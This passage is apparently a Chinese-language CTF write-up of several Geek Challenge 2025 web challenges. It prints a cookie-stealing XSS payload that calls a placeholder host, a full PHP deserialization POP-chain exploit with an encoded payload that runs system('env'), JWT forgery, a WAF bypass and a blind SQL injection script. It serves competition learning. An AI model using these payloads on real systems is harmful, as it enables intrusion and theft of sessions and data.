        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><h2 id="阿基里斯追乌龟">阿基里斯追乌龟<a hidden class="anchor" aria-hidden="true" href="#阿基里斯追乌龟">#</a></h2>
<p>抓包修改 <code>achilles_distanc</code> ，改为和 <code>tortoise_distanc</code> 一样大：</p>
<p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/3.png"></p>
<p>flag：</p>
<p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/2.png"></p>
<h2 id="vibe-seo">Vibe SEO<a hidden class="anchor" aria-hidden="true" href="#vibe-seo">#</a></h2>
<p>获取站点地图 <code>sitemap.xml</code>：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;urlset&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;url&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;loc&gt;</span>http://localhost/<span style="color:#f92672">&lt;/loc&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;changefreq&gt;</span>weekly<span style="color:#f92672">&lt;/changefreq&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/url&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;url&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;loc&gt;</span>http://localhost/aa__^^.php<span style="color:#f92672">&lt;/loc&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;changefreq&gt;</span>never<span style="color:#f92672">&lt;/changefreq&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/url&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/urlset&gt;</span>
</span></span></code></pre></div><p>访问 <code>aa__^^.php</code>，根据报错判断是个任意文件读取：</p>
<pre tabindex="0"><code>Warning: Undefined array key &#34;filename&#34; in /var/www/html/aa__^^.php on line 3
</code></pre><p>文件名最长为10，正好读取 <code>aa__^^.php</code>：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$flag <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#39;/my_secret.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strlen</span>($_GET[<span style="color:#e6db74">&#39;filename&#39;</span>]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">11</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">readfile</span>($_GET[<span style="color:#e6db74">&#39;filename&#39;</span>]);
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Filename too long&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>一开始用伪协议 <code>php://fd</code> 无法读取到flag，猜测是分配的fd比较大，改用 <code>/dev/fd</code> 来爆破 0~99，在 <code>/dev/fd/13</code> 读取到flag内容：</p>
<p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/9.png"></p>
<h2 id="xross-the-finish-line">Xross The Finish Line<a hidden class="anchor" aria-hidden="true" href="#xross-the-finish-line">#</a></h2>
<p>过滤了空格，单双引号，script，error，img</p>
<p>xss窃取cookie：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">svg</span><span style="color:#f92672">/</span><span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`http://ip:port/steal?c=</span><span style="color:#e6db74">${</span>document.<span style="color:#a6e22e">cookie</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)<span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><h2 id="expression">Expression<a hidden class="anchor" aria-hidden="true" href="#expression">#</a></h2>
<p>爆破出jwt密钥：<code>secret</code>，伪造jwt：</p>
<p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/8.png"></p>
<p>猜测有ejs模板渲染：</p>
<p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/7.png"></p>
<h2 id="popself">popself<a hidden class="anchor" aria-hidden="true" href="#popself">#</a></h2>
<p>index.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">All_in_one</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $KiraKiraAyu;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $_4ak5ra;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $K4per;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $Samsāra;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $komiko;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $Fox;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $Eureka;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $QYQS;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $sleep3r;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $ivory;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $L;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__set</span>($name, $value){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;他还是没有忘记那个&#34;</span><span style="color:#f92672">.</span>$value<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;收集夏日的碎片吧&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $fox <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Fox</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>($fox <span style="color:#a6e22e">instanceof</span> <span style="color:#a6e22e">All_in_one</span>) <span style="color:#f92672">&amp;&amp;</span> $fox()<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;summer&#34;</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;QYQS enjoy summer&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;开启循环吧&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>            $komiko <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">komiko</span>;
</span></span><span style="display:flex;"><span>            $komiko<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Eureka</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">L</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sleep3r</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__invoke</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;恭喜成功signin!&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;welcome to Geek_Challenge2025!&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>        $f <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Samsāra</span>;
</span></span><span style="display:flex;"><span>        $arg <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ivory</span>;
</span></span><span style="display:flex;"><span>        $f($arg);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__destruct</span>(){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;你能让K4per和KiraKiraAyu组成一队吗&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_string</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">KiraKiraAyu</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_string</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">K4per</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">md5</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">KiraKiraAyu</span>))<span style="color:#f92672">===</span><span style="color:#a6e22e">md5</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">K4per</span>)){
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;boys和而不同&lt;br&gt;&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">md5</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">KiraKiraAyu</span>))<span style="color:#f92672">==</span><span style="color:#a6e22e">md5</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">K4per</span>)){
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;BOY♂ sign GEEK&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;开启循环吧&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>                $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">QYQS</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">partner</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;summer&#34;</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;BOY♂ can`t sign GEEK&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">md5</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">KiraKiraAyu</span>))<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">md5</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">K4per</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;boys堂堂正正&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__tostring</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;再走一步...&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>        $a <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_4ak5ra</span>;
</span></span><span style="display:flex;"><span>        $a();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__call</span>($method, $args){        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strlen</span>($args[<span style="color:#ae81ff">0</span>])<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">&amp;&amp;</span> ($args[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">10000</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;再走一步&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> $args[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;你要努力进窄门&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">summer</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">find_myself</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;summer&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$payload <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;24_SYC.zip&#34;</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($payload)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unserialize</span>($payload);
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;没有大家的压缩包的话，瓦达西！&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>注意md5那部分需要最后0e后的都是数字才能绕过，否则仍被当作字符串比较无法绕过，还有后续科学计数法绕过时需要是字符串类型，否则长度会是数值的长度导致无法绕过<code>strlen</code></p>
<p><code>__destruct() -&gt; __set() -&gt; __call() -&gt; __tostring() -&gt; __invoke()</code>，exp：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">All_in_one</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $KiraKiraAyu;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $_4ak5ra;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $K4per;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $Samsāra;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $komiko;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $Fox;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $Eureka;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $QYQS;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $sleep3r;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $ivory;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $L;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">summer</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">find_myself</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;summer&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// __invoke
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$obj1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">All_in_one</span>();
</span></span><span style="display:flex;"><span>$obj1<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Samsāra</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;system&#34;</span>;
</span></span><span style="display:flex;"><span>$obj1<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ivory</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;env&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// __toString
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$obj2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">All_in_one</span>();
</span></span><span style="display:flex;"><span>$obj2<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_4ak5ra</span> <span style="color:#f92672">=</span> $obj1;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// __set+__call
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$obj3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">All_in_one</span>();
</span></span><span style="display:flex;"><span>$obj3<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Fox</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;summer::find_myself&#34;</span>;
</span></span><span style="display:flex;"><span>$obj3<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">komiko</span> <span style="color:#f92672">=</span> $obj2;
</span></span><span style="display:flex;"><span>$obj3<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Eureka</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;nonexistence&#34;</span>;
</span></span><span style="display:flex;"><span>$obj3<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">L</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1e5&#34;</span>;	<span style="color:#75715e">// $args[0]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$obj3<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sleep3r</span> <span style="color:#f92672">=</span> $obj2; <span style="color:#75715e">// $args[1]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>$obj4 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">All_in_one</span>();
</span></span><span style="display:flex;"><span>$obj4<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">KiraKiraAyu</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;iv2Cn&#34;</span>; <span style="color:#75715e">// f2WfQ
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$obj4<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">K4per</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;240610708&#34;</span>;
</span></span><span style="display:flex;"><span>$obj4<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">QYQS</span> <span style="color:#f92672">=</span> $obj3;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($obj4));
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>payload：</p>
<pre tabindex="0"><code>?24[SYC.zip=O%3A10%3A%22All_in_one%22%3A11%3A%7Bs%3A11%3A%22KiraKiraAyu%22%3Bs%3A5%3A%22iv2Cn%22%3Bs%3A7%3A%22_4ak5ra%22%3BN%3Bs%3A5%3A%22K4per%22%3Bs%3A9%3A%22240610708%22%3Bs%3A8%3A%22Sams%C4%81ra%22%3BN%3Bs%3A6%3A%22komiko%22%3BN%3Bs%3A3%3A%22Fox%22%3BN%3Bs%3A6%3A%22Eureka%22%3BN%3Bs%3A4%3A%22QYQS%22%3BO%3A10%3A%22All_in_one%22%3A11%3A%7Bs%3A11%3A%22KiraKiraAyu%22%3BN%3Bs%3A7%3A%22_4ak5ra%22%3BN%3Bs%3A5%3A%22K4per%22%3BN%3Bs%3A8%3A%22Sams%C4%81ra%22%3BN%3Bs%3A6%3A%22komiko%22%3BO%3A10%3A%22All_in_one%22%3A11%3A%7Bs%3A11%3A%22KiraKiraAyu%22%3BN%3Bs%3A7%3A%22_4ak5ra%22%3BO%3A10%3A%22All_in_one%22%3A11%3A%7Bs%3A11%3A%22KiraKiraAyu%22%3BN%3Bs%3A7%3A%22_4ak5ra%22%3BN%3Bs%3A5%3A%22K4per%22%3BN%3Bs%3A8%3A%22Sams%C4%81ra%22%3Bs%3A6%3A%22system%22%3Bs%3A6%3A%22komiko%22%3BN%3Bs%3A3%3A%22Fox%22%3BN%3Bs%3A6%3A%22Eureka%22%3BN%3Bs%3A4%3A%22QYQS%22%3BN%3Bs%3A7%3A%22sleep3r%22%3BN%3Bs%3A5%3A%22ivory%22%3Bs%3A3%3A%22env%22%3Bs%3A1%3A%22L%22%3BN%3B%7Ds%3A5%3A%22K4per%22%3BN%3Bs%3A8%3A%22Sams%C4%81ra%22%3BN%3Bs%3A6%3A%22komiko%22%3BN%3Bs%3A3%3A%22Fox%22%3BN%3Bs%3A6%3A%22Eureka%22%3BN%3Bs%3A4%3A%22QYQS%22%3BN%3Bs%3A7%3A%22sleep3r%22%3BN%3Bs%3A5%3A%22ivory%22%3BN%3Bs%3A1%3A%22L%22%3BN%3B%7Ds%3A3%3A%22Fox%22%3Bs%3A19%3A%22summer%3A%3Afind_myself%22%3Bs%3A6%3A%22Eureka%22%3Bs%3A12%3A%22nonexistence%22%3Bs%3A4%3A%22QYQS%22%3BN%3Bs%3A7%3A%22sleep3r%22%3Br%3A14%3Bs%3A5%3A%22ivory%22%3BN%3Bs%3A1%3A%22L%22%3Bs%3A3%3A%221e5%22%3B%7Ds%3A7%3A%22sleep3r%22%3BN%3Bs%3A5%3A%22ivory%22%3BN%3Bs%3A1%3A%22L%22%3BN%3B%7D
</code></pre><p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/6.png"></p>
<h2 id="one-last-image">one last image<a hidden class="anchor" aria-hidden="true" href="#one-last-image">#</a></h2>
<p>PNG头 + 短标签 绕过waf:</p>
<p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/4.png"></p>
<p>flag在环境变量里：</p>
<p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/5.png"></p>
<h2 id="sequal-no-uta">Sequal No Uta<a hidden class="anchor" aria-hidden="true" href="#sequal-no-uta">#</a></h2>
<p>单引号闭合：</p>
<p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/10.png"></p>
<p>过滤了空格，注释符绕过：</p>
<p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/11.png"></p>
<p>布尔盲注，先查 <code>sqite_lmaster</code> 表里的创建语句：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sql</span>():
</span></span><span style="display:flex;"><span>    target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://019a6318-c732-7f8b-8582-ffeba4a20572.geek.ctfplus.cn/check.php&#34;</span>
</span></span><span style="display:flex;"><span>    sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">250</span>): 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>whitespace <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">~!@#$%^&amp;*()_+-=&#34;</span> <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>ascii_uppercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits:
</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;admin&#39;/**/and/**/substr((select/**/group_concat(sql)/**/from/**/sqlite_master),</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">,1)=&#39;</span><span style="color:#e6db74">{</span>char<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;&#34;</span>
</span></span><span style="display:flex;"><span>            params <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;name&#34;</span>: payload}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>target, params<span style="color:#f92672">=</span>params)
</span></span><span style="display:flex;"><span>           
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;该用户存在且活跃&#34;</span> <span style="color:#f92672">in</span> resp<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>                sql <span style="color:#f92672">+=</span> char
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found: </span><span style="color:#e6db74">{</span>sql<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> sql
</span></span></code></pre></div><p><code>users</code> 表创建语句：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">TABLE</span> users(
</span></span><span style="display:flex;"><span>id INTEGER PRIMARYKEY AUTO <span style="color:#66d9ef">INCREMENT</span>
</span></span><span style="display:flex;"><span>username TEXT <span style="color:#66d9ef">UNIQUE</span> <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>
</span></span><span style="display:flex;"><span>password TEXT <span style="color:#66d9ef">UNIQUE</span> <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>
</span></span><span style="display:flex;"><span>is_active INTEGER <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span> <span style="color:#66d9ef">DEFAULT</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>secret TEXT )
